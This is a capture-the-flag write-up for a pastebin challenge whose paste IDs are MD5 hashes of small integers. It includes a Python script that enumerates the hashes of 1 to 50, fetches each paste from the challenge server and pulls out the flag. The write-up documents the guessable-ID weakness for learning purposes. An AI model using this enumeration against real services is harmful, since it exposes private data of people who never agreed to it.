# Pastebin - CTF Writeup

## Challenge
We are given a pastebin site and told Jack stored sensitive data there. We don't have the link, but the site returns an MD5-like hash after saving a paste. Example hash: `c0c7c76d30bd3dcaefc96f40275bdc0a`, which is the MD5 of `50`.

The hint suggests only a few pastebins are needed, so the hash likely corresponds to a small numeric range. We can brute-force MD5 of numbers 1–50 and request each paste URL to see the contents.

## Approach
1. Generate MD5 for numbers 1–50.
2. For each hash, request `http://141.85.224.115:7202/pastebin/<hash>`.
3. Parse the returned HTML and extract the `<textarea>` content.
4. Print any content found (look for the flag).

## Script
Save as `solve.py`:

```python
import hashlib
import re
import requests

BASE = "http://141.85.224.115:7202/pastebin/"

for n in range(1, 51):
    h = hashlib.md5(str(n).encode()).hexdigest()
    url = BASE + h
    r = requests.get(url, timeout=5)
    if r.status_code != 200:
        continue

    # Extract textarea content from the HTML response
    m = re.search(r"<textarea[^>]*>(.*?)</textarea>", r.text, re.S | re.I)
    if m:
        content = m.group(1).strip()
        if content:
            print(f"{n} {h} -> {content}")
```

## Usage
```bash
python3 solve.py
```

Inspect the output and look for the flag in the paste content.

## Flag
We found the following flag

`CRYPTO_CTF{IncreaseTheCount|HashItAllAround}`
